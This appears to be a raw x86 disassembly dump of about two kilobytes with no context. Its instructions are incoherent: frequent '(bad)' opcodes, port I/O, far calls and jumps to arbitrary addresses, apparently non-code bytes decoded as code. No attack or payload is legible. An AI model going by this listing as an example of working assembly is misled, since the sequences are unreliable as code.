  40b7f3:	push   es
  40b7f4:	inc    ebp
  40b7f5:	adc    BYTE PTR ds:0xc9fe98a9,bl
  40b7fb:	jmp    0xf144394b
  40b800:	fwait
  40b801:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b802:	pop    ebp
  40b803:	or     edi,DWORD PTR ds:0xd474aa80
  40b809:	loope  0x40b84d
  40b80b:	inc    esp
  40b80c:	enter  0x42de,0x66
  40b810:	cld    
  40b811:	or     al,BYTE PTR [esi+0x77]
  40b814:	and    cl,BYTE PTR [esi-0x7ceebb9d]
  40b81a:	pop    ds
  40b81b:	mov    ebp,0x1d10df70
  40b820:	lea    esi,[ecx+0x71]
  40b823:	add    al,0xf4
  40b825:	jg     0x40b7e0
  40b827:	outs   dx,BYTE PTR ds:[esi]
  40b828:	xchg   edx,eax
  40b829:	sbb    eax,DWORD PTR [ebp+0xd]
  40b82c:	arpl   WORD PTR [edi+0x3f],ax
  40b82f:	xchg   edi,eax
  40b830:	ja     0x40b7c4
  40b832:	leave  
  40b833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b834:	outs   dx,DWORD PTR cs:[esi]
  40b836:	repz push 0xffffffac
  40b839:	pop    ecx
  40b83a:	adc    al,0x19
  40b83c:	call   0xb77e:0xc397bd74
  40b843:	cmp    eax,0x54fa082f
  40b848:	mov    edi,0x2b05d0d2
  40b84d:	mov    ds:0x78cca117,al
  40b852:	xor    eax,DWORD PTR [ebx+eax*2+0x5a9e44c3]
  40b859:	call   0xfbe89691
  40b85e:	ins    BYTE PTR es:[edi],dx
  40b85f:	mov    DWORD PTR [esi],0x36655b2e
  40b865:	inc    edi
  40b866:	pop    ebx
  40b867:	sahf   
  40b868:	jle    0x40b8a4
  40b86a:	in     al,dx
  40b86b:	lods   eax,DWORD PTR ds:[esi]
  40b86c:	fstp   QWORD PTR [edx+0x5a561acb]
  40b872:	xadd   esp,esi
  40b875:	mov    ds:0x770ecc7c,eax
  40b87a:	pop    esp
  40b87b:	add    eax,0x8170bbc7
  40b880:	in     eax,0x34
  40b882:	jno    0x40b89e
  40b884:	inc    edi
  40b885:	sbb    DWORD PTR [esi+ecx*4],edx
  40b888:	sahf   
  40b889:	sbb    cl,dl
  40b88b:	xor    al,0x38
  40b88d:	loope  0x40b887
  40b88f:	stos   DWORD PTR es:[edi],eax
  40b890:	(bad)  
  40b891:	or     eax,0x1cdd53ab
  40b896:	xchg   ebp,eax
  40b897:	clc    
  40b898:	stos   BYTE PTR es:[edi],al
  40b899:	in     al,dx
  40b89a:	push   ebx
  40b89b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b89c:	push   ecx
  40b89d:	xchg   edi,eax
  40b89e:	leave  
  40b89f:	and    al,0x29
  40b8a1:	mov    ecx,0xa2c7229d
  40b8a6:	fcom   QWORD PTR [ebp+0x2c4d5197]
  40b8ac:	fcmovnu st,st(6)
  40b8ae:	xchg   ebp,eax
  40b8af:	call   0x7879:0xf3daf912
  40b8b6:	mov    WORD PTR ds:0xdc693f50,?
  40b8bc:	xlat   BYTE PTR ds:[ebx]
  40b8bd:	add    al,0x87
  40b8bf:	jmp    0x3a22c7bd
  40b8c4:	ret    0x17ee
  40b8c7:	aaa    
  40b8c8:	sub    ch,0x9c
  40b8cb:	fbld   TBYTE PTR [esi-0x47]
  40b8ce:	loopne 0x40b8a4
  40b8d0:	in     al,0xa9
  40b8d2:	std    
  40b8d3:	mul    DWORD PTR [edi-0x78]
  40b8d6:	fs dec ebp
  40b8d8:	out    dx,al
  40b8d9:	outs   dx,DWORD PTR ds:[esi]
  40b8da:	leave  
  40b8db:	jp     0x40b86f
  40b8dd:	dec    ecx
  40b8de:	lahf   
  40b8df:	inc    esp
  40b8e0:	push   eax
  40b8e1:	push   es
  40b8e2:	and    esp,DWORD PTR [eax-0x1512cc61]
  40b8e8:	repz cmp BYTE PTR [ebx-0x689a0479],dh
  40b8ef:	cld    
  40b8f0:	push   edi
  40b8f1:	int    0x33
  40b8f3:	cs int 0xd8
  40b8f6:	sbb    eax,0xc5a93cd6
  40b8fb:	or     BYTE PTR [eax+0x7c],bh
  40b8fe:	inc    esp
  40b8ff:	jo     0x40b968
  40b901:	loope  0x40b8cf
  40b903:	adc    bl,BYTE PTR [ebx-0x24058224]
  40b909:	mov    edx,0x83d58490
  40b90e:	dec    ecx
  40b90f:	and    esi,DWORD PTR [ecx-0x542a2842]
  40b915:	shl    BYTE PTR ds:0xff811e0b,0x7
  40b91c:	or     eax,0x4be9cacf
  40b921:	div    BYTE PTR [edi]
  40b923:	lods   al,BYTE PTR ds:[esi]
  40b924:	mov    ah,BYTE PTR [edx-0x54]
  40b927:	fs adc edi,ebx
  40b92a:	xor    BYTE PTR [edx+0x67],dh
  40b92d:	push   esi
  40b92e:	mov    DWORD PTR es:[edi+0x6c0c59e2],eax
  40b935:	add    esp,edi
  40b937:	shl    DWORD PTR [edi+eiz*2-0x45b85424],1
  40b93e:	jb     0x40b91b
  40b940:	xor    bh,BYTE PTR [ebx+0x23]
  40b943:	xchg   BYTE PTR [eax],cl
  40b945:	les    edi,FWORD PTR ds:0xf91eb339
  40b94b:	and    bl,cl
  40b94d:	xchg   esi,eax
  40b94e:	inc    edx
  40b94f:	jle    0x40b969
  40b951:	xchg   esp,eax
  40b952:	leave  
  40b953:	(bad)  
  40b954:	sub    eax,0xcfafa46c
  40b959:	jg     0x40b9c0
  40b95b:	adc    BYTE PTR [ecx],dh
  40b95d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b95e:	mov    edi,ecx
  40b960:	jg     0x40b99a
  40b962:	sbb    eax,0x54f72177
  40b967:	addr16 into 
  40b969:	fcmove st,st(0)
  40b96b:	lahf   
  40b96c:	pop    ds
  40b96d:	jl     0x40b92e
  40b96f:	cmp    DWORD PTR [ebp+0x6f01aa1f],esi
  40b975:	nop
  40b976:	out    0xd,eax
  40b978:	test   eax,0x7d124c4d
  40b97d:	xchg   ebp,eax
  40b97e:	adc    ah,BYTE PTR [ecx+0x32852f32]
  40b984:	inc    ebp
  40b985:	ins    BYTE PTR es:[edi],dx
  40b986:	ds cmp eax,0x873cdb02
  40b98c:	outs   dx,DWORD PTR ds:[esi]
  40b98d:	pusha  
  40b98e:	inc    esp
  40b98f:	leave  
  40b990:	icebp  
  40b991:	mov    eax,ds:0x14e93a73
  40b996:	test   al,ch
  40b998:	inc    eax
  40b999:	and    al,0x2c
  40b99b:	dec    esi
  40b99c:	push   0x17
  40b99e:	not    DWORD PTR [esp+edx*4-0x632892ea]
  40b9a5:	mov    edi,0xe2dd8493
  40b9aa:	ja     0x40b961
  40b9ac:	(bad)  [edi]
  40b9ae:	push   es
  40b9af:	mov    ecx,eax
  40b9b1:	outs   dx,BYTE PTR ds:[esi]
  40b9b2:	mov    ebp,eax
  40b9b4:	jge    0x40ba28
  40b9b6:	lock scas eax,DWORD PTR es:[edi]
  40b9b8:	xchg   cl,bh
  40b9ba:	imul   ecx,DWORD PTR [ebx+0x3d],0xffffffa0
  40b9be:	inc    ebp
  40b9bf:	jbe    0x40b977
  40b9c1:	mov    ecx,0xe84ca2f0
  40b9c6:	and    al,0x50
  40b9c8:	push   0x1b
  40b9ca:	fiadd  WORD PTR [eax-0x7757599]
  40b9d0:	cmp    BYTE PTR [ecx-0x69],ah
  40b9d3:	lock and ebx,DWORD PTR [ebp-0x7ba74238]
  40b9da:	clc    
  40b9db:	or     ah,ah
  40b9dd:	mov    esi,0xaec1c600
  40b9e2:	shl    dl,0xc5
  40b9e5:	js     0x40b997
  40b9e7:	xor    ah,0x2b
  40b9ea:	pop    esi
  40b9eb:	jl     0x40b9d7
  40b9ed:	jl     0x40ba07
  40b9ef:	out    0x33,al
  40b9f1:	jns    0x40ba03
  40b9f3:	mov    BYTE PTR [edx+0x4e30f3d9],dl
  40b9f9:	aaa    
  40b9fa:	mov    DWORD PTR [edi+eiz*4],esi
  40b9fd:	mov    eax,0x570afd2c
  40ba02:	mov    ch,0x7
  40ba04:	sbb    eax,0x21ddd647
  40ba09:	push   edx
  40ba0a:	outs   dx,BYTE PTR ds:[esi]
  40ba0b:	pop    eax
  40ba0c:	and    BYTE PTR [edi-0x22],dl
  40ba0f:	mov    esi,0xb81a1cf6
  40ba14:	mov    BYTE PTR [esi+0xf],al
  40ba17:	sbb    dh,BYTE PTR [eax+eax*1-0x54bee0dc]
  40ba1e:	or     ebx,esp
  40ba20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba21:	call   0xa1747974
  40ba26:	test   DWORD PTR [edi-0x21065f06],esi
  40ba2c:	pop    DWORD PTR ds:0x81efd9db
  40ba32:	push   ss
  40ba33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba34:	jae    0x40b9f8
  40ba36:	jp     0x40b9de
  40ba38:	xor    edx,ebp
  40ba3a:	push   ebp
  40ba3b:	xchg   esp,eax
  40ba3c:	mov    al,0xc9
  40ba3e:	fs jbe 0x40ba07
  40ba41:	fstp   st(1)
  40ba43:	jge    0x40ba1b
  40ba45:	cmp    dl,BYTE PTR [eax-0x4b]
  40ba48:	cwde   
  40ba49:	cli    
  40ba4a:	outs   dx,BYTE PTR ds:[esi]
  40ba4b:	sahf   
  40ba4c:	sub    al,BYTE PTR [ebx+esi*2+0x3e]
  40ba50:	scas   eax,DWORD PTR es:[edi]
  40ba51:	cmp    al,0xec
  40ba53:	pop    ss
  40ba54:	in     eax,0xc4
  40ba56:	xchg   edx,eax
  40ba57:	aaa    
  40ba58:	test   bh,ah
  40ba5a:	loop   0x40baca
  40ba5c:	stos   BYTE PTR es:[edi],al
  40ba5d:	jmp    0xac45481c
  40ba62:	or     al,0xaa
  40ba64:	xlat   BYTE PTR ds:[ebx]
  40ba65:	into   
  40ba66:	jge    0x40ba44
  40ba68:	data16 cli 
  40ba6a:	int3   
  40ba6b:	cdq    
  40ba6c:	fs (bad) 
  40ba6e:	jno    0x40bab6
  40ba70:	clc    
  40ba71:	test   ch,cl
  40ba73:	stos   DWORD PTR es:[edi],eax
  40ba74:	or     eax,0xc9b847f4
  40ba79:	pop    edi
  40ba7a:	shl    BYTE PTR [edi+0x6b481a49],cl
  40ba80:	pop    ds
  40ba81:	xor    DWORD PTR [esi],edi
  40ba83:	int    0xd9
  40ba85:	or     esi,DWORD PTR [eax-0x3a]
  40ba88:	jmp    0x1d590006
  40ba8d:	mov    BYTE PTR [eax],bl
  40ba8f:	jo     0x40bac1
  40ba91:	mov    bl,0x28
  40ba93:	shl    dh,0xd4
  40ba96:	push   eax
  40ba97:	cmp    DWORD PTR [esi],edx
  40ba99:	out    0x7,al
  40ba9b:	sbb    ebx,DWORD PTR [esi+0x3818d53d]
  40baa1:	fld    DWORD PTR [eax+0x7e3c0ff7]
  40baa7:	xchg   esp,eax
  40baa8:	mov    BYTE PTR [ecx+0x79ed82da],ch
  40baae:	sahf   
  40baaf:	icebp  
  40bab0:	cs push eax
  40bab2:	mov    al,ds:0x9a9d39fb
  40bab7:	sbb    ecx,0x67
  40baba:	out    dx,eax
  40babb:	jp     0x40bb16
  40babd:	jmp    0x40ba7e
  40babf:	add    esi,DWORD PTR [esi]
  40bac1:	es js  0x40ba5e
  40bac4:	or     dl,BYTE PTR [eax+0x21]
  40bac7:	mov    al,ds:0xcea22b71
  40bacc:	mov    WORD PTR [ecx+0x4c0d8833],cs
  40bad2:	loope  0x40baa2
  40bad4:	(bad)  
  40bad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bad6:	stos   DWORD PTR es:[edi],eax
  40bad7:	loope  0x40bb4b
  40bad9:	sub    DWORD PTR ds:[eax-0x681e2f8f],edx
  40bae0:	pop    esp
  40bae1:	sbb    DWORD PTR [ebp+edi*2-0x79],edi
  40bae5:	jb     0x40bac9
  40bae7:	pop    esi
  40bae8:	imul   eax,DWORD PTR [ecx+0x58],0xf3df1d35
  40baef:	popa   
  40baf0:	mov    dl,BYTE PTR [edi]
  40baf2:	pop    ds
  40baf3:	inc    esi
  40baf4:	pusha  
  40baf5:	jmp    0xb1eacb39
  40bafa:	mov    al,bh
  40bafc:	aaa    
  40bafd:	jnp    0x40bab1
  40baff:	xchg   ebx,eax
  40bb00:	jns    0x40bb19
  40bb02:	test   eax,0x259e7237
  40bb07:	mov    BYTE PTR [ebx+esi*8+0x7d534478],ch
  40bb0e:	aaa    
  40bb0f:	add    BYTE PTR [eax],dl
  40bb11:	sub    eax,0xf8842989
  40bb16:	cli    
  40bb17:	fld    TBYTE PTR [edx+ecx*1]
  40bb1a:	ins    BYTE PTR es:[edi],dx
  40bb1b:	ds gs inc eax
  40bb1e:	mov    ebp,0xb575444d
  40bb23:	les    ebp,FWORD PTR ds:0x57a402e0
  40bb29:	push   ds
  40bb2a:	add    al,0x87
  40bb2c:	fild   WORD PTR [ebx+0x45]
  40bb2f:	jl     0x40bb35
  40bb31:	jmp    0x40bb2a
  40bb33:	shl    dl,1
  40bb35:	lea    ebp,[edi-0x4c2086f5]
  40bb3b:	sbb    BYTE PTR [ebx-0x2b2d474a],dh
  40bb41:	test   eax,0xa5c21adf
  40bb46:	sbb    al,0xe6
  40bb48:	scas   eax,DWORD PTR es:[edi]
  40bb49:	sub    ebp,eax
  40bb4b:	not    ecx
  40bb4d:	or     DWORD PTR [esi+0x60],edx
  40bb50:	std    
  40bb51:	mov    dl,0x31
  40bb53:	xchg   edx,eax
  40bb54:	call   0xf408:0x97c61f07
  40bb5b:	iret   
  40bb5c:	sub    edi,edx
  40bb5e:	sbb    ecx,DWORD PTR [edi-0x4d]
  40bb61:	mov    BYTE PTR [edi+0x37347b7b],dl
  40bb67:	pop    ecx
  40bb68:	dec    ebp
  40bb69:	sbb    esi,DWORD PTR [ebx+eiz*1+0x6]
  40bb6d:	pop    ecx
  40bb6e:	xor    BYTE PTR [edi],dl
  40bb70:	jnp    0x40bb11
  40bb72:	adc    BYTE PTR [ebp-0x7c],ah
  40bb75:	(bad)  
  40bb76:	icebp  
  40bb77:	int3   
  40bb78:	push   edi
  40bb79:	push   ebp
  40bb7a:	(bad)  
  40bb7b:	adc    al,0x8b
  40bb7d:	sub    bh,BYTE PTR [esi+0x3ab62015]
  40bb83:	inc    ebp
  40bb84:	jno    0x40bc03
  40bb86:	jno    0x40bbbb
  40bb88:	mov    edi,0x6acb1e3e
  40bb8d:	xor    BYTE PTR [ebx],0xc4
  40bb90:	xor    al,0xbc
  40bb92:	sbb    DWORD PTR [edi],ebp
  40bb94:	xchg   esi,eax
  40bb95:	dec    esi
  40bb96:	jge    0x40bbbc
  40bb98:	xor    DWORD PTR [ecx+0x79b48ec],esp
  40bb9e:	scas   al,BYTE PTR es:[edi]
  40bb9f:	sub    ch,al
  40bba1:	pop    edx
  40bba2:	add    bh,ch
  40bba4:	add    ch,ch
  40bba6:	xor    BYTE PTR [ebx-0xa82d0b],0xd8
  40bbad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bbae:	in     al,dx
  40bbaf:	enter  0x9698,0x7c
  40bbb3:	sub    ah,0x64
  40bbb6:	jmp    0x878e82e
  40bbbb:	mov    ebp,0x40191419
  40bbc0:	(bad)  
  40bbc1:	imul   ebx,DWORD PTR [eax-0x2e],0x45
  40bbc5:	mov    ds:0xcf621405,eax
  40bbca:	push   eax
  40bbcb:	jp     0x40bb58
  40bbcd:	add    al,0x2e
  40bbcf:	retf   0xe20e
  40bbd2:	mov    ebp,0x60dbb297
  40bbd7:	mov    bl,BYTE PTR [ebx+0x1ff1096f]
  40bbdd:	jmp    0x40bc2f
  40bbdf:	and    DWORD PTR [eax],edi
  40bbe1:	pmaddwd mm4,mm3
  40bbe4:	xor    BYTE PTR [ecx],bl
  40bbe6:	dec    esi
  40bbe7:	sub    ebp,eax
  40bbe9:	aad    0xc
  40bbeb:	daa    
  40bbec:	xlat   BYTE PTR ds:[ebx]
  40bbed:	mov    ah,0x53
  40bbef:	mov    al,ds:0x8fa28a9a
  40bbf4:	mov    dl,0xb5
  40bbf6:	pop    ds
  40bbf7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bbf8:	adc    eax,0x47745c78
  40bbfd:	out    dx,al
  40bbfe:	add    BYTE PTR [esi+ecx*1+0x84f5c59],0xe1
  40bc06:	hlt    
  40bc07:	push   eax
  40bc08:	pop    ecx
  40bc09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bc0a:	dec    esp
  40bc0b:	mov    cl,0x57
  40bc0d:	dec    ax
  40bc0f:	push   ss
  40bc10:	sbb    cl,ch
  40bc12:	jmp    DWORD PTR [ebx+0x5de96372]
  40bc18:	loop   0x40bc1c
  40bc1a:	inc    eax
  40bc1b:	(bad)  
  40bc1c:	pop    es
  40bc1d:	cdq    
  40bc1e:	fcomp  QWORD PTR ds:0x60731b0a
  40bc24:	xor    BYTE PTR [eax],bl
  40bc26:	mov    esi,DWORD PTR [ebx-0x8]
  40bc29:	adc    ecx,DWORD PTR [ebp+0x5224b29a]
  40bc2f:	push   edi
  40bc30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc31:	fdivr  QWORD PTR [edx]
  40bc33:	call   0xf6ce19fb
  40bc38:	ret    
  40bc39:	and    dh,BYTE PTR [edi]
  40bc3b:	or     eax,0x293df4ba
  40bc40:	or     eax,0x2ad5a22d
  40bc45:	lds    edx,FWORD PTR [edx]
  40bc47:	int    0xe6
  40bc49:	adc    al,0xbb
  40bc4b:	into   
  40bc4c:	cmc    
  40bc4d:	and    dl,dh
  40bc4f:	cwde   
  40bc50:	mov    dl,0xf1
  40bc52:	adc    eax,0x92b9bb2e
  40bc57:	test   al,0x62
  40bc59:	cdq    
  40bc5a:	xor    edi,edi
  40bc5c:	jmp    0x40bcc8
  40bc5e:	mov    ch,0xc6
  40bc60:	dec    esi
  40bc61:	out    0xb5,al
  40bc63:	bound  ebx,QWORD PTR [edx-0x6e]
  40bc66:	vhaddps ymm7,ymm1,ymm1
  40bc6a:	fcomp  DWORD PTR [eax+esi*8]
  40bc6d:	xchg   edi,eax
  40bc6e:	out    0x40,al
  40bc70:	das    
  40bc71:	pop    esi
  40bc72:	add    eax,0xf8c60866
  40bc77:	stc    
  40bc78:	mov    dl,0x6f
  40bc7a:	aaa    
  40bc7b:	repnz ds and al,0xd6
  40bc7f:	push   ebx
  40bc80:	pop    esi
  40bc81:	in     al,0xc8
  40bc83:	fisttp QWORD PTR [esi-0x6d5eaf61]
  40bc89:	pop    ecx
  40bc8a:	or     DWORD PTR [eax+0x27c5acbc],esi
  40bc90:	sbb    DWORD PTR [ebx-0x18],esp
  40bc93:	pop    edx
  40bc94:	mov    DWORD PTR [ebx+0x24],esp
  40bc97:	ror    ebp,cl
  40bc99:	push   cs
  40bc9a:	cli    
  40bc9b:	fld    DWORD PTR [eax+ebp*8]
  40bc9e:	inc    ebp
  40bc9f:	arpl   WORD PTR [edi],bp
  40bca1:	pushf  
  40bca2:	cdq    
  40bca3:	mov    esi,0x7712be90
  40bca8:	inc    edx
  40bca9:	xchg   DWORD PTR [edi+0x35],ecx
  40bcac:	or     dl,al
  40bcae:	or     DWORD PTR [eax-0x58],0x54
  40bcb2:	out    dx,eax
  40bcb3:	or     bh,dl
  40bcb5:	inc    ebx
  40bcb6:	sti    
  40bcb7:	lock aad 0x6b
  40bcba:	jns    0xa1a27477
  40bcc0:	lock int3 
  40bcc2:	pop    ecx
  40bcc3:	out    0x74,eax
  40bcc5:	dec    ebx
  40bcc6:	mov    ds:0xa8c63717,al
  40bccb:	jae    0x40bce1
  40bccd:	and    ebx,DWORD PTR [eax]
  40bccf:	or     eax,0x9051759b
  40bcd4:	dec    ebp
  40bcd5:	out    0xe0,eax
  40bcd7:	inc    eax
  40bcd8:	add    ch,BYTE PTR [edi+0x6c4e9e31]
  40bcde:	ret    
  40bcdf:	cmp    edi,ebp
  40bce1:	push   0x9be721af
  40bce6:	(bad)  
  40bce7:	xlat   BYTE PTR ds:[ebx]
  40bce8:	hlt    
  40bce9:	sbb    dh,bh
  40bceb:	dec    ebx
  40bcec:	jle    0x40bd4c
  40bcee:	mov    ah,0x44
  40bcf0:	(bad)  [edx-0x49]
  40bcf3:	push   ebp
  40bcf4:	shr    DWORD PTR [eax],1
  40bcf6:	jl     0x40bd07
  40bcf8:	jmp    ebp
  40bcfa:	pop    ds
  40bcfb:	out    dx,eax
  40bcfc:	dec    esi
  40bcfd:	popf   
  40bcfe:	jl     0x40bcb5
  40bd00:	fimul  DWORD PTR [eax]
  40bd02:	test   al,0xe0
  40bd04:	aaa    
  40bd05:	cmp    al,0x14
  40bd07:	inc    edx
  40bd08:	into   
  40bd09:	jecxz  0x40bd6d
  40bd0b:	cmp    dh,BYTE PTR [edx]
  40bd0d:	neg    BYTE PTR [eax]
  40bd0f:	or     BYTE PTR [ebx-0x48172edb],dh
  40bd15:	mov    eax,ds:0xba7dd61b
  40bd1a:	addr16 mov bl,0x2f
  40bd1d:	in     eax,dx
  40bd1e:	mov    ebp,0x26cb4fea
  40bd23:	inc    ecx
  40bd24:	mov    al,ds:0x6f0ed18b
  40bd29:	mov    bl,0xd6
  40bd2b:	cmp    esi,esi
  40bd2d:	fwait
  40bd2e:	cmp    DWORD PTR [edi-0x585c6568],eax
  40bd34:	fiadd  WORD PTR [edx+edx*8]
  40bd37:	cli    
  40bd38:	out    dx,eax
  40bd39:	mov    esi,DWORD PTR [edx+eax*2-0x7]
  40bd3d:	dec    ebp
  40bd3e:	stos   BYTE PTR es:[edi],al
  40bd3f:	bound  edi,QWORD PTR [ebx+0x5f7f524b]
  40bd45:	jns    0x40bce0
  40bd47:	xchg   ebx,eax
  40bd48:	ss pop esp
  40bd4a:	dec    ebx
  40bd4b:	and    BYTE PTR [esi],bl
  40bd4d:	pushf  
  40bd4e:	pop    edx
  40bd4f:	or     ah,BYTE PTR [ebx-0x36]
  40bd52:	sub    al,0x1e
  40bd54:	jne    0x40bd19
  40bd56:	jae    0x40bdc7
  40bd58:	scas   eax,DWORD PTR es:[edi]
  40bd59:	xor    eax,0x4deebe1b
  40bd5e:	cmp    al,0xa6
  40bd60:	pop    edi
  40bd61:	dec    eax
  40bd62:	dec    ebp
  40bd63:	sbb    eax,0x2a3a9363
  40bd68:	pop    esi
  40bd69:	aad    0xd9
  40bd6b:	adc    BYTE PTR [ebp-0x72a94f5b],dh
  40bd71:	mov    bh,0x12
  40bd73:	add    eax,0x2f463511
  40bd78:	or     bh,BYTE PTR [esi+0x48]
  40bd7b:	pusha  
  40bd7c:	pop    ds
  40bd7d:	aam    0x99
  40bd7f:	pusha  
  40bd80:	mov    cl,0xf9
  40bd82:	je     0x40bd8f
  40bd84:	xchg   edi,eax
  40bd85:	shl    DWORD PTR [ecx+eax*4],cl
  40bd88:	sbb    dh,BYTE PTR [edx+0x57]
  40bd8b:	mov    edi,0x929dfbb3
  40bd90:	push   ebx
  40bd91:	nop
  40bd92:	push   edx
  40bd93:	mov    esi,?
  40bd95:	xchg   ecx,ebx
  40bd97:	cli    
  40bd98:	mov    esp,0xc81604a7
  40bd9d:	out    0x7d,eax
  40bd9f:	in     al,dx
  40bda0:	outs   dx,DWORD PTR ds:[esi]
  40bda1:	loop   0x40bd3f
  40bda3:	ins    BYTE PTR es:[edi],dx
  40bda4:	cli    
  40bda5:	aaa    
  40bda6:	ret    
  40bda7:	jnp    0x40bdc5
  40bda9:	loopne 0x40be1a
  40bdab:	(bad)  
  40bdac:	out    dx,eax
  40bdad:	ins    BYTE PTR es:[edi],dx
  40bdae:	and    dh,BYTE PTR [edi+eax*1+0x7ac3acec]
  40bdb5:	sub    ebx,DWORD PTR [ecx+0x34b34fbb]
  40bdbb:	push   eax
  40bdbc:	jecxz  0x40bddd
  40bdbe:	xlat   BYTE PTR ds:[ebx]
  40bdbf:	test   DWORD PTR [ebx+0x30],0x5e96f3ea
  40bdc6:	bound  edx,QWORD PTR [esp+ebx*2+0x48b1aff0]
  40bdcd:	xchg   ecx,eax
  40bdce:	cmp    eax,0x3683a57c
  40bdd3:	mov    ds:0x133c014e,eax
  40bdd8:	inc    esi
  40bdd9:	sub    al,0x88
  40bddb:	jp     0x40bd60
  40bddd:	pushf  
  40bdde:	cmp    al,0xb3
  40bde0:	cwde   
  40bde1:	add    edi,DWORD PTR [ebx]
  40bde3:	jno    0x40bdbc
  40bde5:	out    dx,al
  40bde6:	mov    ebx,DWORD PTR [eax]
  40bde8:	cld    
  40bde9:	sub    ebx,ebp
  40bdeb:	sub    al,0xcc
  40bded:	in     eax,0x9a
  40bdef:	mov    dh,0x8f
  40bdf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bdf2:	sub    eax,0xb667340c
  40bdf7:	fstp   DWORD PTR [esi]
  40bdf9:	cmp    DWORD PTR [ebp-0x42],edi
  40bdfc:	xchg   edx,eax
  40bdfd:	xor    ebp,ebp
  40bdff:	mov    BYTE PTR [ecx],bl
  40be01:	jno    0x40bd9a
  40be03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40be04:	out    0xa4,al
  40be06:	ret    0xbeb8
  40be09:	pop    ecx
  40be0a:	dec    edx
  40be0b:	push   ecx
  40be0c:	fmul   DWORD PTR [esi-0x3b1044e4]
  40be12:	aam    0xfa
  40be14:	xchg   esp,eax
  40be15:	push   DWORD PTR [ebp+edx*2+0x7e34e337]
  40be1c:	adc    ah,bh
  40be1e:	ret    0x1ca6
  40be21:	add    ch,al
  40be23:	(bad)  
  40be24:	leave  
  40be25:	test   al,0x1e
  40be27:	dec    ecx
  40be28:	dec    ebx
  40be29:	shr    BYTE PTR [ecx],0xec
  40be2c:	mov    al,ds:0xbcf0167c
  40be31:	cdq    
  40be32:	nop
  40be33:	mov    al,0x2b
  40be35:	add    al,0x6a
  40be37:	xor    dh,BYTE PTR [edi+0x7c]
  40be3a:	das    
  40be3b:	mov    eax,ds:0x18cd922a
  40be40:	cdq    
  40be41:	out    dx,al
  40be42:	cmp    dl,BYTE PTR ss:[esi+0x70c2ac9c]
  40be49:	cmc    
  40be4a:	leave  
  40be4b:	jecxz  0x40be73
  40be4d:	jns    0x40bec8
  40be4f:	pop    ebx
  40be50:	push   edx
  40be51:	mov    ebx,DWORD PTR [ecx]
  40be53:	stc    
  40be54:	cmp    al,0x6a
  40be56:	xor    edx,ebx
  40be58:	iret   
  40be59:	pop    ss
  40be5a:	in     eax,dx
  40be5b:	adc    DWORD PTR [ebp+0x5a],esp
  40be5e:	xchg   ebx,eax
  40be5f:	lds    ebx,FWORD PTR [ecx-0x79a769e9]
  40be65:	retf   0x54f
  40be68:	push   ebp
  40be69:	xchg   ebp,eax
  40be6a:	sub    esi,DWORD PTR [edx-0x105666c4]
  40be70:	in     al,dx
  40be71:	stos   BYTE PTR es:[edi],al
  40be72:	sbb    al,BYTE PTR [eax+0x2de5b1a5]
  40be78:	mov    al,0xa8
  40be7a:	imul   BYTE PTR [ebp-0x18]
  40be7d:	outs   dx,BYTE PTR ds:[esi]
  40be7e:	push   esi
  40be7f:	fdivr  DWORD PTR [esi+0x5507c79a]
  40be85:	cmp    ebx,DWORD PTR [edi+0x2970cd27]
  40be8b:	ss repnz mov esi,ebp
  40be8f:	cli    
  40be90:	ss call 0x7c54:0x5ee6886f
  40be98:	mov    ch,0x60
  40be9a:	pop    esi
  40be9b:	ins    BYTE PTR es:[edi],dx
  40be9c:	cmp    al,0xa7
  40be9e:	adc    al,ah
  40bea0:	xchg   edi,eax
  40bea1:	aad    0x1
  40bea3:	sub    al,0xb4
  40bea5:	jnp    0x40beda
  40bea7:	sbb    BYTE PTR [ecx],ah
  40bea9:	adc    cl,BYTE PTR [edi+0x65191233]
  40beaf:	xor    BYTE PTR [edi],0xf4
  40beb2:	(bad)  
  40beb3:	xchg   esi,eax
  40beb4:	fwait
  40beb5:	jno    0x40bf32
  40beb7:	test   al,0x4
  40beb9:	add    al,0xfe
  40bebb:	fistp  QWORD PTR [esp+eax*8]
  40bebe:	mov    al,ds:0xf9b3761d
  40bec3:	or     BYTE PTR [eax+0x1ad755d],al
  40bec9:	xor    al,0x62
  40becb:	and    bl,ah
  40becd:	or     cl,BYTE PTR [ebx-0x13b5b345]
  40bed3:	mov    DWORD PTR gs:[esi-0x292aec4d],edx
  40beda:	xchg   edi,eax
  40bedb:	and    al,0xd5
  40bedd:	es dec esp
  40bedf:	fsub   st,st(4)
  40bee1:	jne    0x40be69
  40bee3:	inc    eax
  40bee4:	scas   eax,DWORD PTR es:[edi]
  40bee5:	inc    ebp
  40bee6:	and    BYTE PTR [edx+ebx*4],0x3f
  40beea:	push   edi
  40beeb:	les    eax,FWORD PTR [ecx+0x31a9020f]
  40bef1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bef2:	add    al,0xf0
  40bef4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bef5:	aam    0x3f
  40bef7:	cmc    
  40bef8:	or     ecx,edi
  40befa:	dec    ebp
  40befb:	lock dec esp
  40befd:	xor    eax,0xf3115dca
  40bf02:	test   BYTE PTR [edx-0x4b],bl
  40bf05:	fwait
  40bf06:	pop    eax
  40bf07:	pushf  
  40bf08:	int    0x1d
  40bf0a:	dec    edx
  40bf0b:	push   esi
  40bf0c:	pop    esi
  40bf0d:	add    cl,BYTE PTR [ebp-0x4c0d98f9]
  40bf13:	jp     0x40bf8c
  40bf15:	jne    0x40bf60
  40bf17:	push   esi
  40bf18:	sub    esp,0x75
  40bf1b:	mov    al,0x29
  40bf1d:	loope  0x40bf19
  40bf1f:	mov    eax,0x1b30d50d
  40bf24:	dec    edx
  40bf25:	mov    ah,0xc3
